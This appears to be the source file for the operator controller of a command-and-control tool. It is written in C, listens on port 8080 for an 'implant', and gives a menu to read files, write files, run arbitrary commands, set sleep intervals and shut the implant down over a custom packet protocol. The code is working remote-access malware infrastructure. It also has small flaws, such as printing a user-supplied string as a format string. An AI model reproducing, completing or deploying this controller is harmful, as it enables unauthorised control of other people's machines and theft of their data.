#include <stdio.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <netdb.h>
#include <string.h>
#include "protocol.h"
#include <stdlib.h>
#include "controller_utils.h"

void process_response(Packet *response, int request_id, int client_fd, int controller_fd)
{

    if (response == NULL)
    {

        printf("ERROR:connection error \n");
        close(client_fd);
        close(controller_fd);
        exit(1);
    }

    if (response->request_id != request_id)
    {

        printf("ERROR: request ID mismatch, expected %d got %d\n", request_id, response->request_id);
        close(client_fd);
        close(controller_fd);
        free_packet(response);
        exit(1);
    }

    print_packet_contents(response); // if we reach here then everything is all set!
    free_packet(response);
}

void display_prompt()
{

    printf("Select a command:\n");
    printf("  1 - HEARTBEAT\n");
    printf("  2 - SET_SLEEP\n");
    printf("  3 - SHUTDOWN\n");
    printf("  4 - READ_DATA\n");
    printf("  5 - WRITE_DATA\n");
    printf("  6 - RUN_CMD\n");
    printf("> ");
}

int console_input()
{
    int choice;
    while (1)
    {
        char input_buffer[32];
        display_prompt();

        if (fgets(input_buffer, sizeof(input_buffer), stdin) == NULL)
        {
            printf("\n");
            printf("Input error. Try again. \n");
            continue;
        }

        // only flush if newline wasn't consumed by fgets
        if (strchr(input_buffer, '\n') == NULL)
        {
            flush_stdin(); // ← only called when buffer was too small
        }

        if ((sscanf(input_buffer, "%d", &choice) == 1) && (choice >= 1 && choice <= 6))
        {
            break;
        }

        printf("INVALID INPUT! Please enter an integer from 1-6. \n");
    }

    return choice;
}

char *parameters_input(char *display_message)
{
    char *input = malloc(256);
    printf(display_message);
    fgets(input, 256, stdin);

    // only flush if newline wasn't consumed
    if (strchr(input, '\n') == NULL)
    {
        flush_stdin();
    }

    input[strcspn(input, "\n")] = '\0';
    return input;
}

int main(int argc, char *argv[])
{

    int controller_fd = socket(AF_INET, SOCK_STREAM, 0);
    int client_fd = -1;

    if (controller_fd < 0)
    {
        perror("socket");
        return 1;
    }

    struct sockaddr_in server_ip_structure;
    memset(&server_ip_structure, 0, sizeof(server_ip_structure));
    server_ip_structure.sin_family = AF_INET;
    server_ip_structure.sin_port = htons(8080);
    server_ip_structure.sin_addr.s_addr = INADDR_ANY;

    if (bind(controller_fd, (struct sockaddr *)&server_ip_structure, sizeof(server_ip_structure)) < 0)
    {

        perror("bind:");
        close(controller_fd);
        return 1;
    }

    printf("<Controller Listening on port: %d> \n\n", ntohs(server_ip_structure.sin_port));

    if (listen(controller_fd, 2) < 0)
    { // listening on port 8080

        perror("listen");
        close(controller_fd);
        return 1;
    }

    struct sockaddr_in client_ip_structure;
    socklen_t size_of_client = sizeof(client_ip_structure);

    if ((client_fd = accept(controller_fd, (struct sockaddr *)&client_ip_structure, &size_of_client)) < 0) // This is blocking
    {

        perror("accept");
        close(controller_fd);
        return 1;
    }

    printf("<Succesfully established connection to implant, now waiting for HELLO............\n\n>");

    Packet *first_response = recieve_packet(client_fd);

    if (first_response == NULL || first_response->command_type != COMMAND_HELLO)
    {
        printf("Unknown inital packet sent from implant! \n\n");
        close(client_fd);
        close(controller_fd);
        return 1;
    }
    print_packet_contents(first_response);
    free_packet(first_response);

    int request_id = 0;
    int running = 1;

    while (running)
    { // while true, as we want the connection to last until we set a

        Command user_choice = console_input();

        printf("<USER PICKED:%d \n\n>", user_choice);

        switch (user_choice)
        {

        case COMMAND_HEARTBEAT:
        {

            printf("[DEBUG] HEARTBEAT case entered\n");
            fflush(stdout);

            request_id++;
            Packet heartbeat_packet = {COMMAND_HEARTBEAT, request_id, 0, 0};

            printf("[DEBUG] calling send_packet\n");
            fflush(stdout);
            send_packet(&heartbeat_packet, client_fd);

            printf("[DEBUG] send_packet returned\n");
            fflush(stdout);
            Packet *response = recieve_packet(client_fd);

            process_response(response, request_id, client_fd, controller_fd);

            // print response to the screen
            break;
        }

        case COMMAND_READ_DATA:
        {

            char *path = parameters_input("Enter the path to file to read: ");

            request_id++;
            Packet cmd_packet = {COMMAND_READ_DATA, request_id, strlen(path), path};

            send_packet(&cmd_packet, client_fd);

            free(path);

            Packet *response = recieve_packet(client_fd);

            process_response(response, request_id, client_fd, controller_fd);

            break;
        }

            // payload is the path of the file to read from, need to prompt user

        case COMMAND_WRITE_DATA:
        {

            char *path = parameters_input("Enter the path to file to write to (include the new file name in path): ");

            char *data = parameters_input("Enter the data to write:");

            int path_len = strlen(path);
            int data_len = strlen(data);

            int total_bytes = 4 + path_len + data_len;

            char *payload = (char *)malloc(total_bytes);

            memcpy(payload, &path_len, 4);
            memcpy(payload + 4, path, path_len);
            memcpy(payload + 4 + path_len, data, data_len);
            request_id++;
            Packet write_data = {COMMAND_WRITE_DATA, request_id, total_bytes, payload};
            send_packet(&write_data, client_fd);
            free(data);
            free(path);
            free(payload);

            Packet *response = recieve_packet(client_fd);

            process_response(response, request_id, client_fd, controller_fd);

            break;
        }

        case COMMAND_RUN_CMD:
        {
            char *cmd = parameters_input("Enter command to run: ");

            request_id++;
            Packet cmd_packet = {COMMAND_RUN_CMD, request_id, strlen(cmd), cmd};

            send_packet(&cmd_packet, client_fd);
            free(cmd);

            Packet *response = recieve_packet(client_fd);

            process_response(response, request_id, client_fd, controller_fd);

            break;
        }

        case COMMAND_SET_SLEEP:
        {

            char *sleep = parameters_input("Enter the time to sleep in seconds: ");

            int sleep_data = atoi(sleep);

            char *payload = (char *)malloc(4);

            memcpy(payload, &sleep_data, 4);
            request_id++;
            Packet set_sleep = {COMMAND_SET_SLEEP, request_id, 4, payload};
            send_packet(&set_sleep, client_fd);
            free(sleep);
            free(payload);

            Packet *first_response = recieve_packet(client_fd);

            process_response(first_response, request_id, client_fd, controller_fd);

            // reconnect
            struct sockaddr_in client_ip_structure;
            socklen_t size_of_client = sizeof(client_ip_structure);

            if ((client_fd = accept(controller_fd, (struct sockaddr *)&client_ip_structure, &size_of_client)) < 0) // This is blocking
            {

                perror("accept");
                close(controller_fd);
                return 1;
            }

            Packet *second_response = recieve_packet(client_fd);

            process_response(second_response, 0, client_fd, controller_fd);

            request_id = 0; // change request id to zero as we slept and reconnected!

            break;
        }

        case COMMAND_SHUTDOWN:
        {

            request_id++;
            Packet shutdown = {COMMAND_SHUTDOWN, request_id, 0, NULL};
            send_packet(&shutdown, client_fd);
            Packet *response = recieve_packet(client_fd);

            process_response(response, request_id, client_fd, controller_fd);

            running = 0;
            break;
        }

        default:
        }
    }
    close(client_fd);
    close(controller_fd);

    return 0;
}
